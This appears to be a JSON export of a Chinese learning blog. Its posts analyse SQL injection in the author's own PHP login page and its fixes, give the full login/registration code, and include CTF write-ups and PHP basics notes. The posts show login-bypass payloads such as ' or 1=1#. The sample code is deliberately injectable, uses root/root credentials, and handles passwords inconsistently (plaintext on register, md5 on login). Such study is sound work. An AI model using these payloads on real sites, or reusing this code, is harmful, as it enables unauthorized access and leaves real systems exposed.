语句，在脚本执行期间包括并运行这个PHP文件。因为如果攻击者获得了登录验证的源码，就会得到数据库的用户名和密码。 当phpstudy根目录(WWW目录)下的phpMyAdmin文件未删除时，攻击者会通过获得的数据库的用户名和密码，登进phpMyAdmin，查看管理员的数据库。(当然也可以考虑将phpMyAdmin文件删除，这样上面和下面的操作就可以忽略。当然，我没有删除)。 注意：若没有删除phpMyAdmin文件，还需要更改一下phpMyAdmin的登录用户名和密码，这个百度、谷歌上都有教程，可以参考一下。改好后，就可以防止直接从phpMyAdmin进入数据库啦！！ 漏洞2 观察上面的SQL查询命令，发现了使用动态拼装SQL语句。直接将用户提交过来的数据(用户名和密码)直接拿去执行，并没有实现进行特殊字符过滤，这是十分危险的。 当进行SQL注入攻击时，在用户名输入框中输入:’ or 1=1#,密码随便输入，这时候的合成后的SQL查询语句为： $sql=&quot;select * from users where username=&#39;&#39; or 1=1#&#39; and password=&#39;$password&#39;&quot;; 分析：“#”在mysql中是注释符，这样井号后面的内容将被mysql视为注释内容，这样就不会去执行了，与以下sql语句等价：select * from users where username=&#39;&#39; or 1=1 #可以注释掉后面的一行SQL代码 相当于去掉了一个where条件。MySQL 注释, 过滤掉后面的SQL语句，使其不起作用。因为1=1永远是都是成立的，即where子句总是为真。 应对方法： 方法一： 对于这个语句，可以使用下面的技术对用户输入的内容进行过滤： （1）替换单引号，即把所有单独出现的单引号改成两个单引号，防止攻击者修改SQL命令的含义。再来看这个payload语句，select * from users where username=&#39;&#39;&#39; or &#39;&#39;1&#39;&#39;=&#39;&#39;1&#39; and password=&#39;&#39;&#39; or &#39;&#39;1&#39;&#39;=&#39;&#39;1&#39;显然会得到与select * from users where username=&#39;&#39; or &#39;1&#39;=&#39;1&#39; and password=&#39;&#39; or &#39;1&#39;=&#39;1&#39;不同的结果 （2）删除用户输入内容中的所有连字符，防止攻击者构造出类如select * from users where username= &#39;mas&#39; —— and password =&#39;&#39;之类的查询，因为这类查询的后半部分已经被注释掉，不再有效，攻击者只要知道一个合法的用户登录名称，根本不需要知道用户的密码就可以顺利获得访问权限。 （3）对于用来执行查询的数据库帐户，限制其权限。用不同的用户帐户执行查询、插入、更新、删除操作。由于隔离了不同帐户可执行的操作，因而也就防止了原本用于执行select命令的地方却被用于执行insert、update或delete命令。 方法二： 先通过SQL语句查询数据库，取出相关数据 function collect_data(){ require_once (&quot;mysql_connect.php&quot;); //在脚本执行期间包括并运行mysql_connect.php $sql = &quot;select * from users&quot;; //查询数据表语句，并用变量$sql存放 $result = mysql_query($sql);//执行MySQL语句，并将结果用变量$result存放 $colum= mysql_fetch_array($result);//获取和显示$result的数据 return $colum;//返回变量$colum的数据 } 然后再将用户提交过来的数据(用户名和密码)和返回的数据进行比对，成功比对才能登录成功。 方法三： PHP有一个特制的功能以防止这些攻击。所有你需要做的就是使用一个函数mysql_real_escape_string()。 mysql_real_escape_string所做的是把一个输入的字符串,在MySQL查询时将它处理为用户输入的真实字符串，来防止SQL注入。就是将用户输入可能引起Mysql安全隐患的字符串比如单引号(‘)，用逃脱引用来表示\\ ‘。 将这个函数应用到上面那个可能被注入的例子中： $username = mysql_real_escape_string($_POST[&#39;username&#39;]); $password= mysql_real_escape_string($_POST[&#39;password&#39;]); $sql = &quot;select*from users where username= &#39;$username&#39; and password=&#39;$password&#39;&quot;; 这里要十分小心的是，mysql_real_escape_string要先成功地通过mysql_connect连接到mysql server上以后才能正常使用,如果数据库 还没连接直接使用这个函数会报错。上面经过函数转化后，$sql最后打印出来的语句为： select*from users where username=&#39;$username\\&#39; OR 1=1 -- and password=&#39;$password\\&#39; OR 1=1 --&#39; 也就是说变量$username和$password所存放的数据后面的单引号(‘)被转义为真实的输入字符，不再和$username和$password前的字符进行匹配，$username和$password前的单引号将和字符串–后面的单引号进行匹配。 让我们创建一个通用的函数，你可以用任何名字来命名它，在这里，我要将它命名为”mres”： function mres($var){ if (get_magic_quotes_gpc()){/*magic_quotes_gpc作用类似addslashes()，就是对输入的字符创中的字符进行转义处理，所有的 ‘ (单引号), ” (双引号), (反斜线) and 空字符会自动转为含有反斜线的溢出字符*/ $var = stripslashes(trim($var));//stripslashes删除由 addslashes() 函数添加的反斜杠 } return mysql_real_escape_string(trim($var)); } 现在，可以把函数简化成下面这个样子： $username = mres($_POST[&#39;username&#39;]); $password = mres($_POST[&#39;password&#39;]); $sql = &quot;select*from users where username= &#39;$username&#39; and password=&#39;$password&#39;&quot;; 漏洞3 is_array() 函数用于检测变量是否是一个数组，如果检测的变量是数组，则返回 TRUE，否则返回 FALSE。 很明显当SQL语句直接在数据库执行后。没有对结果进行有无特殊字符的判断和过滤。 当然，为了配合漏洞2的第二种应对方法。这里可以进行是否全等的判断 if(($colum[&#39;username&#39;]===$username) &amp;&amp; ($colum[&#39;password&#39;]===$password)){ if($i==1&amp;&amp;(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600))){ echo&quot;&lt;script type=&#39;text/javascript&#39;&gt;alert(&#39;登陆成功&#39;);location=&#39;index.php&#39;;&lt;/script&gt;&quot;; } } 这样就解决了这个问题。 漏洞貌似总结的差不多了耶！开心！！用常规SQL注入方法已经注入不进去了。但本人能力有限，若有其他漏洞，敬请大佬告知啊。本小白感激不尽！！！ 小白进阶ing","categories":[{"name":"线下赛","slug":"线下赛","permalink":"https://qwzf.github.io/categories/线下赛/"},{"name":"团队内部","slug":"线下赛/团队内部","permalink":"https://qwzf.github.io/categories/线下赛/团队内部/"}],"tags":[{"name":"BUG","slug":"BUG","permalink":"https://qwzf.github.io/tags/BUG/"},{"name":"SQL注入","slug":"SQL注入","permalink":"https://qwzf.github.io/tags/SQL注入/"},{"name":"PHP","slug":"PHP","permalink":"https://qwzf.github.io/tags/PHP/"}],"author":"qwzf"},{"title":"php mysql  html css制作带Cookie登陆页面","slug":"php mysql  html css制作带Cookie登陆页面","date":"2019-04-26T02:08:26.561Z","updated":"2020-08-01T15:43:33.323Z","comments":true,"path":"2019/04/26/php mysql  html css制作带Cookie登陆页面/","link":"","permalink":"https://qwzf.github.io/2019/04/26/php mysql  html css制作带Cookie登陆页面/","excerpt":"","text":"这两天写了个防绕过的带Cookie登录注册页面，学习借鉴了好多知识，感觉这些知识还是需要总结总结的，总结正在登录中。。。。。 1、登录(Login)1.登陆页面(login.html) Login的html实现代码 &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;title&gt;登录页面&lt;/title&gt; &lt;style&gt; *{margin:0;padding:0;}/*去掉页面样式*/ .content{ position:absolute;/*绝对定位*/ top:50%; left:0; width:100%; height:500px; margin-top:-220px; overflow:hidden;/*隐藏滚动条*/ opacity:0.6; } .main{ text-align:center;/*文本居中*/ max-width:600px; height:500px; padding:100px 0px;/*上下80px,左右为0*/ margin:0 auto;/*设置上右下左,居中显示*/ background-color:#0099ee; } .main h2{ font-size:70px;/*设置字体大小*/ font-weight:2px;/*调整字体粗细*/ } form{ padding:30px 0; } form input{ border:1px solid block; display:block; margin:0px auto 10px auto;/*上 右 下 左*/ padding:10px; width:280px; font-size:18px; font-weight:300px; text-align:center; } form input:hover{ background-color:#0066aa; } .button{ background-color:#0099ff; } img{ width:100%; height:100%; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;content&quot;&gt; &lt;div class=&quot;main&quot;&gt; &lt;h2&gt;Login&lt;/h2&gt; &lt;form action=&quot;login_1.php&quot; method=&quot;post&quot; &gt;&lt;!--向login_1.php提交表单--&gt; 用户名&lt;input type=&quot;text&quot; name=&quot;username&quot; placeholder=&quot;username&quot; /&gt; 密码&lt;input type=&quot;password&quot; name=&quot;password&quot; placeholder=&quot;password&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;立即登录&quot; class=&quot;button&quot; /&gt; &lt;a href=&quot;register.html&quot;&gt;用户注册&lt;/a&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;img src=&quot;2.jpg&quot; /&gt; &lt;/body&gt; &lt;/html&gt; 2.登录验证(login_1.php)&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); $db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;)//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码 or die(&quot;连接数据库失败！&quot;); mysql_select_db(&quot;demo&quot;,$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库 or die(&quot;您要选择的数据库不存在&quot;.mysql_error()); $username=$_POST[&#39;username&#39;];//用$username存放从login.html表单提交过来的username $password=$_POST[&#39;password&#39;];//用$password存放从login.html表单提交过来的password $sql=&quot;select * from users where username=&#39;$username&#39; and password=md5(&#39;$password&#39;)&quot;;/*用$sql存放sql查询判断命令，$password的数据进行md5加密*/ $result = mysql_query($sql);//mysql_query()规定要发送的SQL查询，查询MySQL，存放于$result。注意：查询字符串不应以分号结束 $colum= mysql_fetch_array($result);//mysql_fetch_array()获取和显示数据 if(is_array($colum)){//is_array()检测变量是否是数组 if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()+3600)){//设置cookie header(&quot;Location:index.php&quot;); } else{ echo &#39;Cookie设置失败&#39;; } } else{ echo &quot;您的用户名或密码输入有误，&lt;a href=login.html&gt;请重新登录！&lt;/a&gt;&quot;; } ?&gt; 2、注册(Register.html)1.注册页面(register.html) register的html实现代码 &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=utf-8&quot;&gt; &lt;title&gt;注册页面&lt;/title&gt; &lt;/head&gt; &lt;style type=&quot;text/css&quot;&gt; .main{ position:absolute;/*绝对定位*/ top:50%; left:0; width:100%; height:800px; margin-top:-220px; overflow:hidden;/*隐藏滚动条*/ opacity:0.6;/*透明度*/ } .div{ text-align:center;/*文本居中*/ max-width:600px; height:500px; padding:100px 0px;/*上下80px,左右为0*/ margin:0 auto;/*设置上右下左,居中显示*/ background-color:#88eeff; } .div h2{ font-size:70px;/*设置字体大小*/ font-weight:2px;/*调整字体粗细*/ } form{ padding:30px 0; } form input{ border:1px solid block; display:block; margin:0px auto 10px auto;/*上 右 下 左*/ padding:10px; width:280px; font-size:18px; font-weight:300px; text-align:center; } form input:hover{ background-color:#005599; } .button{ background-color:#00ffee; } img{ width:100%; height:100%; } &lt;/style&gt; &lt;body&gt; &lt;div class=&quot;main&quot;&gt; &lt;div class=&quot;div&quot;&gt; &lt;h2&gt;Register&lt;/h2&gt; &lt;form method=&quot;post&quot; action=&quot;register_1.php&quot;&gt; &lt;!--向register_1.php提交表单--&gt; 用户名&lt;input type=&quot;text&quot; name=&quot;username&quot;&gt; 密码&lt;input type=&quot;password&quot; name=&quot;password&quot;&gt; 再次输入密码：&lt;input type=&quot;password&quot; name=&quot;pwd_again&quot;&gt; &lt;input type=&quot;submit&quot; value=&quot;注册&quot; class=&quot;button&quot;&gt; &lt;/form&gt; &lt;/div&gt; &lt;/div&gt; &lt;img src=&quot;3.jpg&quot; /&gt; &lt;/body&gt; &lt;/html&gt; 2.注册验证(register_1.php)&lt;?php //注册验证 写入数据库 $db = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;)//mysql_connect()建立数据库连接//localhost:连接MySQL地址//root:连接MySQL用户名//root:连接MySQL密码 or die(&quot;连接数据库失败！&quot;); mysql_select_db(&quot;demo&quot;,$db)//mysql_select_db()选择数据库，这里选择的是数据库名为demo的数据库 or die(&quot;您要选择的数据库不存在&quot;.mysql_error()); $username=$_POST[&#39;username&#39;]; //用$username存放从register.html表单提交过来的username $password=$_POST[&#39;password&#39;]; //用$password存放从register.html表单提交过来的password $pwd_again=$_POST[&#39;pwd_again&#39;];//用$pwd_again存放从register.html表单提交过来的pwd_again if($password!=$pwd_again){ echo&quot;两次输入的密码不一致,请重新输入！&quot;; echo&quot;&lt;a href=&#39;register.html&#39;&gt;重新输入&lt;/a&gt;&quot;; } else{ $sql1=&quot;select * from users where username=&#39;$username&#39;&quot;;//用$sql1存放存放sql查询判断命令 $check=mysql_query($sql1);//查询MySQL，存放结果于$check $colum= mysql_fetch_array($check);//获取和显示数据 if(is_array($colum)){ echo&quot;用户名重复，请重新注册&quot;;echo&quot;&lt;a href=&#39;register.html&#39;&gt;返回&lt;/a&gt;&quot;; } else{ if(($username==&#39;&#39;||$password==&#39;&#39;)){ echo&quot;注册不成功！&quot;;echo&quot;&lt;a href=&#39;register.html&#39;&gt;返回&lt;/a&gt;&quot;; } else{ $sql=&quot;insert into users(username,password) values(&#39;$username&#39;,&#39;$password&#39;)&quot;;/*该sql命令是，将变量$username和$password的数据，加入到表名为users且字段名为username和password的数据中。并把该命令存放变量$sql中*/ $result=mysql_query($sql);//查询MySQL，存放结果于$result if(!$result){ echo&quot;注册不成功！&quot;;echo&quot;&lt;a href=&#39;register.html&#39;&gt;返回&lt;/a&gt;&quot;; } else{ echo&quot;注册成功!&quot;;echo&quot;&lt;a href=&#39;login.html&#39;&gt;请登录&lt;/a&gt;&quot;; } } } } ?&gt; 3、登录成功(index.php) index的php实现代码 &lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); if(!isset($_COOKIE[&#39;username&#39;])){//判断是否是正常登录，正常登录设置了cookie,未设置cookie即为非法登录 echo &#39;您的登录非法，请&lt;a href=&quot;login.html&quot;&gt;重新登录&lt;/a&gt;&#39;; exit();//结束整个代码运行 } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=&quot;zh-CN&quot;&gt; &lt;head&gt; &lt;meta charset=utf-8&quot; /&gt; &lt;title&gt;欢迎登录&lt;/title&gt; &lt;style&gt; .show{ position:absolute;/*绝对定位*/ top:50%; left:0; width:100%; height:500px; margin-top:-220px; overflow:hidden;/*隐藏滚动条*/ opacity:0.6; } .show h2{ text-align:center;/*文本居中*/ max-width:600px; height:400px; padding:100px 0px;/*上下80px,左右为0*/ margin:0 auto;/*设置上右下左,居中显示*/ } img{ width:100%; height:100%; } &lt;/style&gt; &lt;/head&gt; &lt;body&gt; &lt;div class=&quot;show&quot;&gt; &lt;h2&gt;Hello World!&lt;br /&gt;&lt;a href=&quot;logout.php&quot;&gt;点击注销&lt;/a&gt;&lt;/h2&gt;//跳转到logout.php，实现清除cookie操作 &lt;/div&gt; &lt;img src=&quot;1.jpg&quot; /&gt; &lt;/body&gt; 4、注销(logout.php)&lt;?php header(&#39;Content-type:text/html;charset=utf-8&#39;); if(isset($_COOKIE[&#39;username&#39;])){//如果设置了cookie if(setcookie(&#39;username&#39;,$_POST[&#39;username&#39;],time()-3600)){//清除cookie，跳转到登录页面 header(&#39;Location:login.html&#39;); } else{ echo &#39;注销失败&#39;; header(&#39;Location:logout.php&#39;); } } ?&gt; 5、数据库操作语句写登录验证的时候，发现很多数据库的操作命令忘得差不多了，还是总结下比较好，加深加深自己的印象。。。 创建数据库：create database 数据库名称; 删除数据库：drop database 数据库名称; 创建数据表：create table 表名 ( id int ,username varchar(35),password varchar(40)); ​ id username password 是字段 ,后面的限制是类型 删除数据表：drop table 表名; 选择数据库：use mydata; 增记录：insert into 表名(id,username,password) values(&#39;6&#39;,&#39;$username&#39;,&#39;password&#39;)； ​ id username password 是字段,后面6、$username、$password是记录 删记录：delete from users where id=5; ​ 删除了在表格users中id=5的那条记录，id=5即为范围 改记录：update 表名 set 字段=‘数据’ where 范围; 查： ​ 查库：show databases； ​ 查所有表：show tables； ​ 查表：select*from 表名； ​ 查字段：select*from 表名 where 范围； ​ 查表结构：desc 表名； 6、登录页面的漏洞1.or，–+，#未被过滤填好正确的用户名和密码后，点击提交，将会返回给我们“Hello World!”的界面 select * from users where username=&#39;$username&#39; and password=md5(&#39;$password&#39;) 如果用户名和密码如果正确，就能够成功登陆。但是，如果输入一个错误的用户名或密码呢?很明显，肯定登入不了吧。对于有SQL注入漏洞的网站来说，只要构造个特殊的“字符串”，照样能够成功登录。 如：在用户名输入框中输入:’ or 1=1#或admin’and 1=1 #或admin’#密码随便输入，这时候的合成后的SQL查询语句为： select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39;&#39;) 语义分析：“#”在mysql中是注释符，这样#号后面的内容将被mysql视为注释内容（相当于去掉了一个where条件），这样就不会去执行，与以下sql语句等价： select * from users where username=&#39;&#39; or 1=1#&#39; and password=md5(&#39;&#39;) select * from users where username=&#39;&#39; or 1=1 MySQL 注释, 过滤掉后面的SQL语句，使其不起作用 因为1=1永远是都是成立的，即where子句总是为真，将该sql进一步简化之后，等价于如下select语句： select * from users，该sql语句的作用是检索users表中的所有字段 2、or，–+，#被过滤假设后台sql查询语句为： select * from users where username=’$username’ and password=’$password’ 构造payload(此时的我还不知payload是什么)： reborn’=&#39; 这时候SQL查询语句为： select * from user where username=’reborn’=” and password=’reborn’=” username=’reborn’返回值为0，相当于false，然后0=”的结果为1，相当于true 即注入语句相当于 select * from user where 1 and 1 这是我对我这个登录页面存在的漏洞的简单总结，更多登录框SQL注入漏洞请看这位大佬的博客CTF| SQL注入之login界面，我觉得总结得挺详细的。。。 小白进阶ing。。。。","categories":[{"name":"编程开发","slug":"编程开发","permalink":"https://qwzf.github.io/categories/编程开发/"},{"name":"PHP","slug":"编程开发/PHP","permalink":"https://qwzf.github.io/categories/编程开发/PHP/"}],"tags":[{"name":"Web开发","slug":"Web开发","permalink":"https://qwzf.github.io/tags/Web开发/"},{"name":"登录和注册功能","slug":"登录和注册功能","permalink":"https://qwzf.github.io/tags/登录和注册功能/"}],"author":"qwzf"},{"title":"CTF做题总结(一)","slug":"CTF做题总结(一)","date":"2019-04-16T03:27:05.979Z","updated":"2020-04-01T16:47:18.978Z","comments":true,"path":"2019/04/16/CTF做题总结(一)/","link":"","permalink":"https://qwzf.github.io/2019/04/16/CTF做题总结(一)/","excerpt":"","text":"上个周做了一道MISC题和两道Crypto题。感觉还是总结一下比较好，毕竟做题时查了很多大佬的博客和一些知识点。 1、Crypto-哈夫曼树和哈夫曼编码 刚看到这道题时我毫无头绪。毕竟在写这篇博客时，还没有学过数据结构。而哈夫曼树是数据结构里的一个重要部分。于是我便在百度上搜索有关哈夫曼树和哈夫曼编码的知识。。。。。。。。 哈夫曼树 哈夫曼最大的目的是为了解决当你远距离通信(电报)的数据传输的最优化问题 路径：树中一个结点到另一个结点之间的分支序列构成两个结点间的路径路径长度：路径上的分支数目树的路径长度：树根到每个结点的路径长度的和结点带权路径长度：结点到树根的路径长度与结点的权的乘积树的带权路径长度：树中所以叶子结点的带权路径长度之和（WPL） 哈夫曼编码 学习完这些知识点后，我对哈夫曼树和哈夫曼编码有了大致的了解，就是找最优二叉树，然后哈夫曼编码就是根据每个字母的出现频率不同，按照它们的权值进行构造哈夫曼树。将所有权值左分支改为0，右分支改为1，得到相应字符的的传输数据。 然后，下载解压下载的题目文件，发现一个txt文件，打开后 果然，是哈夫曼编码，由于我现在的编程能力，写不出有关的编码脚本。所以我画了一个哈夫曼树 根据txt文件，我猜想前五位编码应该是flag{，最后一位是}，然后根据这六位编码，调整最底下的g、l、{、}的位置。然后得到每个字符的分配权值： a：000 d：10(或01) g：00101 f：110 l：00111 0：111 5：01(或10) {：00100 }：00110 然后把txt文件里的0和1按照上述权值进行分隔 然后比对每个字符的权值，对分隔好的0和1，进行编码，最终得到两个结果 然后最终答案就是其中的一个啦！！！！ 2、Crypto-滴答滴答这道题题目没有给任何提示，下载文件，发现并不能打开和用winrar解压文件。于是我便选择用notepad++打开 很显然这是摩斯电码，进行解码得到 发现第一个斜杠前有一串特别的字母MORSEISCOOLBUTBACONISCOOLER仿佛看不太懂，写成小写字母morseiscoolbutbaconiscooler很明显，这句话的意思是“摩斯是酷的，但是培根是更酷的”，那么接下来就应该进行培根解密，直接解密，发现不行。查了查培根加密的格式发现，并没有斜杠“/”，于是我用notepad++的替换功能把所有的斜杠去掉，然后培根解密得到 “DO YOU KNOW THE FOUR FENCE ZGIAHYANAUOZNXWI”用百度翻译的意思是“你知道四道栅栏吗？”，可以想到接下来是栅栏密码解密，且每组字数为4。我把所有字符进行解密，发现并没有解出有意义的字符。所以我把“ZGIAHYANAUOZNXWI”进行栅栏解密，最后得到 很显然最终结果出来了，下面进行提交，发现错误。这就应该是格式的问题了，调过之后成功提交了。。 3、MISC-TTL字段从题目中，我们可以知道这道题是TTL字段。然而对此我有点懵，从来没有接触过它。于是我便查有关资料和一些大佬的博客 下载解压题目文件，发现ttl.txt文件，打开发现ttl.txt中的ttl只有4个值63,127,191,255 写出他们的二进制表示后发现只有最高两位不同，63-00111111、127-01111111、191-10111111、255-11111111。于是把4个值替换成00、01、10、11如果传输4个就是一字节，取前面的2位组成8位，对照二进制字母表，可以发现前面是ffd8，jpg图片标志 因为这个脚本我写不出来，于是用了大佬的脚本 fp = open(&#39;ttl.txt&#39;,&#39;r&#39;) a = fp.readlines() p = [] for i in a: p.append(int(i[4:])) s = &#39;&#39; for i in p: if i == 63: a = &#39;00&#39; elif i == 127: a = &#39;01&#39; elif i == 191: a = &#39;10&#39; elif i == 255: a = &#39;11&#39; s += a # print(s) import binascii flag = &#39;&#39; for i in range(0,len(s),8): flag += chr(int(s[i:i+8],2)) flag = binascii.unhexlify(flag) wp = open(&#39;res.jpg&#39;,&#39;wb&#39;) wp.write(flag) wp.close() #00111111 63 #01111111 127 #10111111 191 #11111111 255 然后把ttl.txt和这个脚本(脚本文件名我写成了1.py)放在同一路径，在cmd命令行输入命令python 1.py生成了一个fi.txt文件，打开 这是16进制编码，所以把这些编码粘贴在winhex里生成一个jpg文件，打开 发现只有二维码的一部分，在最后转换出的结果中，发现了六个jpg的文件头（ffd8），说明这就是六张图片，用foremost直接分开(或用strgsolve分离图片)就好了，之后用ps(或ppt)拼在一块 扫描结果如下所示： 应该就是AutoKey(自动密钥密码)那个加密，找了个在线网站解密得到 得到最终flag了！！！！！ 这便是我上周做题的总结，小白进阶ing，欢迎大佬批评指正！","categories":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://qwzf.github.io/tags/CTF/"},{"name":"MISC","slug":"MISC","permalink":"https://qwzf.github.io/tags/MISC/"},{"name":"Crypto","slug":"Crypto","permalink":"https://qwzf.github.io/tags/Crypto/"}],"author":"qwzf"},{"title":"Web开发-PHP基础篇(一-二)","slug":"Web开发-PHP基础篇(一~二)","date":"2019-04-15T12:22:18.275Z","updated":"2020-08-01T15:42:59.836Z","comments":true,"path":"2019/04/15/Web开发-PHP基础篇(一~二)/","link":"","permalink":"https://qwzf.github.io/2019/04/15/Web开发-PHP基础篇(一~二)/","excerpt":"","text":"学前准备学前准备：html、css PHP超文本预处理器 PHP 是一种创建动态交互性站点的强有力的服务器端脚本语言。 php擅长网站开发 php吸收c java perl 允许网站开发人员快速编写的动态页面（信息的更新) php可以运行在windows，linux等各种操作系统上！ 浏览器&gt;输入url地址&gt;显示网站内容 网络主机(硬件)运行 Web服务器(软件) apache管理web服务器 php应用服务器执行php代码，交给apache mysql数据库管理系统 可单独安装一台计算机里 url地址 格式：http://host[:port][abs_path] 理解： http://表示要通过HTTP协议定位网络资源 host表示合法的internet主机域名或者ip地址 port指定一个端口号，可以省略默认为80端口 abs_path被请求资源的位置 DNS服务器：IP 域名 一、PHP基本语法1、初识PHP脚本程序1.PHP语言标记(1)PHP开始标记 &lt;?php (2)PHP结束标记 ?&gt; //完整开始结束写成： &lt;?php ?&gt; php解析器叫做PHP应用服务器 (3)我们的页面最终是通过html,css,js来展示出一个炫丽的界面(4)PHP代码可以嵌入到html代码中任何位置，并且可以嵌入任意多个 (5)文件末尾的?&gt;结束标志可以省略2.指令分隔符”;”(1)在一些PHP语句的结尾要加上;表示一句话的结束,当然 也不需要可以的去记，因为你一旦漏掉分号，程序根本执行不了，会报错!(2)结束标记?&gt;就隐含了一个; 所以在?&gt;之前的PHP语句可以省略掉;3.注释(1)多行注释 /* 多行注释 */ (2)单行注释 //我是单行注释 4.遇到空白的处理空格，tab制表符，换行 (在英文输入法中)这些写在咱们的PHP代码里面是没有问题的。 可以利用这些空白 来增加我们代码的清晰性和可读性! 2、变量变量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器 1.变量的声明 在我们一些编程语言里面比如C语言 使用变量之前要事先通知，事先声明一下！ 注意：在我们的PHP程序里面 使用变量之前是*不需要声明*的！ 变量用于存储 数字、文本字符串 或者数组这些数据! $变量名=数据(值) = 在数学里面是‘等于’的意思,在我们的程序语言里面，它不是等于号，它是 ‘赋值操作符’ 2.变量的释放(销毁) unset($变量名称) $and1=1; unset($and1);//销毁$and1变量 echo $and1;//提示出错，因为变量已经被销毁了！ 3.变量的命名规则(1)变量名称严格区分大写$name,$NAME,$Name都是不同的变量(2)字母或者下划线开头，后面接任意数量的字母数字下划线都可以! 例： $nameudhfdjkjv $_1464fbgrf 错误的命名方式： $1name 错误点：以数字开头了 $n ame 错误点：中间有空白字符 *总结一下：*变量名只能包含 字母 数字 下划线 并且必须以字母或者下划线开头！ (3)最好不要用一些关键字作为变量名称(因为在其他的编程语言里面是完全不被允许的)! 关键字： 4.可变变量 //可变变量 $abc=&#39;test&#39;;//定义了一个变量$abc里面存了值test $$abc=&#39;小明&#39;;//$test=&#39;小明&#39;; echo $test; 5.变量的引用赋值 $a=1000; /*$b=$a;//相当于把$a的值，复制一份再赋值给$b这个变量*/ $b=&amp;$a;//相当于给$a起了一个别名，操作其中任何一个，都会影响到另外一个变量的值! $b=20; echo $a; 3、变量类型概述：变量类型是指保存在该变量中的数据类型。PHP(弱类型语言)对变量类型看的比较淡 使用var_dump(变量名)可以输出变量的类型和变量值！ 1.变量类型简介 (1）bool (布尔型) $a=true; var_dump($a); 往变量里面存true或false，那这个变量就是布尔型 (2）int (整型) 往变量里面存整数，那这个变量就是整型 (3）float (浮点型，也称double) $a=1.1; var_dump($a); 往变量里面存小数，那这个变量就是浮点型 (4）string (字符串) 字符串就是是一系列的字符组成串在一起 1单引号： $b=1; $a=&#39;qwzftest..&#39;; var_dump($a); echo $a; 单(双)引号里不能直接放单引号！！要放单引号，需要在单引号前加反斜杠\\转义 如： $a=&#39;qwzftest\\&#39;afc&#39;; 单引号里的变量不会被解析。所以在定义一些简单的字符串的时候使用单引号，效率比较高 2双引号 $b=100; $a=&#39;te$bst......&#39;; $a=&quot;te{$b}st......&quot;;//双引号里的变量$b({$b})会被解析 var_dump($a); echo $a; 3定界符 $b=200; $a=&lt;&lt;&lt;www dwqdqwdwq{$b}dwqdqdqdqdwqdwqcwcfwefwefcscwec www; var_dump($a); (5）array (数组) (6）object (对象) (7）resource (资源) (8）NULLnull表示一个变量没有值，表示空将变量直接赋值为null声明的变量尚未被赋值被unset函数销毁的变量 $a=1234; unset($a); var_dump($a); 2.变量类型相互转换 强制转换: $a=&#39;小明&#39;; $b=(int)$a; var_dump($a); var_dump($b); 4、常量1.概念：常量是用于临时（只有在我们的程序的运行过程中才存在）存储值（数据）的容器2.定义和使用 define(&#39;常量名称&#39;,常量值) 或者 define(&quot;常量名称&quot;,常量值) 常量的命名：(1)和变量一样 只能包含字母数字下划线 并且必须以 字母或者下划线开头(2)按照惯例常量名字总是大写的(3)自定义的常量是严格区分大小写的defined()函数来检查是否定义了某个常量 3.常量和变量的区别 (1)常量前面没有美元符号($)(2)常量只能用define()函数定义，不能通过赋值语句(3)常量可以不用理会变量范围的规则而在任何地方定义和使用(4)常量一旦被定义就不能被重新定义或者取消定义(5)常量的值只能是bool,int,float,string类型 4.预定义常量 预定义常量就是PHP内核已经帮我们定义好的常量 其中有的预定义常量是一__开头的，这些预定义常量我们又叫它魔术常量 代码所在的位置不同,值也是不同的，所以它叫魔术常量八个常用的魔术常量 预定义常量是不区分大小写的 5、运算符概述：一些符号，这些符号可以将变量或者数据执行某中运算！1.算术运算符(1)+ $a=1; $b=2; $c=$a+$b; echo $c; (2)-第一个意思： 减号 $a=10; $b=2; $c=$a-$b; echo $c; 第二个意思： 取反 $a=1; $b=-$a; echo $b;//-1 echo &#39;&lt;br /&gt;&#39;; echo $a;//1 注意：取反并不会影响到被取反变量本身的值!(3)* 乘号 $a=4; $b=2; $c=$a*$b; echo $c; (4)/ 除号 $a=10; $b=2; $c=$a/$b; echo $c; (5)% 取模 $a=12; $b=2; echo $a%$b; (6)++ 自增前++当在一个语句里面需要使用到被自增的变量的值的时候，前++会先执行自增,然后再返回自增之后的值！ $a=10; echo ++$a;//11 后++当在一个语句里面需要使用到被自增的变量的值的时候，后++会先返回变量的值然后再去执行自增 $a=10; //++$a;//$a=$a+1; //$a++;//$a=$a+1; echo $a++;//echo $a;$a=$a+1; echo &#39;&lt;br /&gt;&#39;; echo $a;//11 注意： $a=10; ++$a;//这种情况不需要用到自增变量值的时候，和后++无区别 echo $a; (7)-- 自减前– $a=10; //$a--;//$a=$a-1; 和--$a没区别; echo --$a;//$a=$a-1;echo $a; echo &#39;&lt;br /&gt;&#39;; echo $a; 后– $a=10; //$a--;//$a=$a-1; 和--$a没区别; echo $a--;//echo $a;$a=$a-1; echo &#39;&lt;br /&gt;&#39;; echo $a; 注意：自增或者自减是对变量而言的！ 2.字符串运算符 . 连接运算符 $a=&#39;小明&#39;; $b=&#39;测试字符串连接符&#39;; echo $a.$b; 3.赋值运算符注意：赋值运算符整个语句是有值的，所以整个语句就是一个表达式，所以我们也可以这么写：$a=$b=2;相当于$a=($b=2);也相当于$a=2;$b=2;= 把右边的值赋给左边的变量$a=1;二元运算符 表达式是 PHP 最重要的基石。在 PHP 